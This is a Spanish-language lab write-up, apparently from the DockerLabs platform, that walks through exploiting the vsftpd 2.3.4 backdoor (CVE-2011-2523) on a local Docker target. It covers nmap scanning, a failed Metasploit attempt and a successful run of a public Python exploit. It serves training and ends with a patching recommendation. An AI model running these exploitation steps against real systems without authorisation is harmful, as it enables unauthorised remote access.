# Write-up: DockerLabs - vsftpd Backdoor Exploitation

Fecha: 2026-10-11
Objetivo: 172.17.0.2
Vulnerabilidad: CVE-2011-2523 (vsftpd 2.3.4 Backdoor)

## 1. Resumen Ejecutivo
Se identificó que el objetivo (172.17.0.2) tiene expuesto el servicio FTP corriendo la versión 2.3.4 de vsftpd. Esta versión contiene una puerta trasera (backdoor) que permite acceso remoto no autorizado. Se logró la explotación mediante un script de Python tras fallar el módulo de Metasploit.

## 2. Reconocimiento
Se realizó un escaneo de puertos completo:
```bash
sudo nmap -p- -sS -sC -sV -T5 -n -Pn -vvv 172.17.0.2
```

Resultado: Puerto 21/tcp abierto (vsftpd 2.3.4).

![[Captura de pantalla 2026-11-10 210615.png]]

## 3. Análisis de Vulnerabilidades
Se ejecutó el motor de scripts de Nmap sobre el puerto 21:
```bash 
sudo nmap -p21 --script=vuln 172.17.0.2
```

Hallazgo: vsFTPd version 2.3.4 backdoor (CVE-2011-2523).

![[Captura de pantalla 2026-11-10 210618.png]]

## 4. Explotación

Intento 1: Metasploit Framework
- Módulo: use exploit/unix/ftp/vsftpd_234_backdoor
- Parámetros: 
	- set RHOSTS 172.17.0.2
	- set LHOST 172.17.0.1
- Resultado: No se estableció sesión interactiva.

![[Captura de pantalla 2026-11-10 210737.png]]

![[Captura de pantalla 2026-11-10 211103.png]]

Intento 2: Explotación Manual (Python Script)
- Repositorio: https://github.com/Maalfer/CVE-2011-2523-vsftpd-2.3.4-exploit
- Procedimiento: Se creó un entorno virtual, se instaló la librería nclib y se ejecutó exploit.py.
- Resultado: Éxito, se estableció la conexión.
```bash
git clone
cd vsftpd-2.3.4-exploit
python3 -m venv librerias
source librerias/bin/activate
pip install nclib

python3 exploit.py 172.17.0.2
```

![[Captura de pantalla 2026-11-10 221726.png]]

![[Captura de pantalla 2026-11-10 221845.png]]
## 5. Conclusiones
- Los exploits manuales en Python suelen ser más estables que los de Metasploit en entornos Docker.
- Recomendación: Actualizar vsftpd o cerrar el puerto 21 si no es necesario.
